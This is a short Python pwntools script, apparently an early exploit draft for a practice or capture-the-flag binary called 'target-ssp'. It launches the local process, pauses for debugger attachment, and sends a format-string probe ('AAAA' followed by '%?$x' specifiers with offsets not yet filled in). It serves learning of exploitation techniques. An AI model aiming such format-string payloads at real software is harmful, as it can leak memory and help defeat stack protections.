#!/usr/bin/env python

from pwn import*
import sys, struct

def exploit():
    p = process(['./target-ssp'])
    print util.proc.pidof(p)
    sys.stdin.read(1)

    print p.recv()
    p.sendline("AAAA" + "%?$x" + "%?$x")

if __name__ == "__main__":
    try:
        exploit()
    except:
        print "[-] Unable to run exploit."
